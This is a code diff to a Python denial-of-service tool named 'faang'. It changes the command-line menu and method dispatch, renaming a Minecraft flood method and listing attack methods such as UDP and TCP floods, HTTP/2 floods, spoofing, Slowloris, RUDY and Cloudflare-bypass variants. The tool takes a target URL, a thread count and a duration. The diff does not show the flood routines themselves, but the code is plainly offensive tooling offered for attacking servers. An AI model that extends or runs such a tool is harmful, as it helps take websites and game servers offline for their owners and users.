@@ -174,7 +174,7 @@ def start():
         DdosFIVEM()
     elif indexSelect.upper() == "4":
         StartTitle(f"Layer4 {Back.MAGENTA}Minecraft PE Server{Back.RESET}")
-        DdosMCPE() 
+        DdosMC() 
         
     elif indexSelect.upper() == "5":
         StartTitle(f"Request GET DDoS")
@@ -227,8 +227,9 @@ def main():
         ua = file.read().split("\n") 
     parser = argparse.ArgumentParser(description=desc(), usage="faang [-l4] [method] [target] [thread] [time]\n   or: faang [-l7] [method] [target] [thread] [time]",
                                      prog="faang")
-    parser.add_argument("method", type=str, nargs='?', default="",
-                        help="Ddos method, run faang to show list")
+    parser.add_argument("method", type=str, nargs='?', default="", 
+                        choices=["udp", "tcp", "fivem", "minecraft", "get", "post", "socket", "http2", "spoof", "head", "sky", "cfreq", "cfsoc", "cfb", "slowloris", "mbp", "rudy"], 
+                        help="Ddos method")
     parser.add_argument("target", type=str, nargs='?', default="",
                         help="Url target, ex : http://example.com/")
     parser.add_argument("thread", type=str, nargs='?', default="",
@@ -276,8 +277,8 @@ def main():
             timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
             timer.start()
             timer.join()
-        elif args.method == "mcpe":
-            threading.Thread(target=LaunchMCPE, args=(targetIp, targetPort, args.thread, args.time)).start()
+        elif args.method == "minecraft":
+            threading.Thread(target=LaunchMC, args=(targetIp, targetPort, args.thread, args.time)).start()
             timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
             timer.start()
             timer.join()
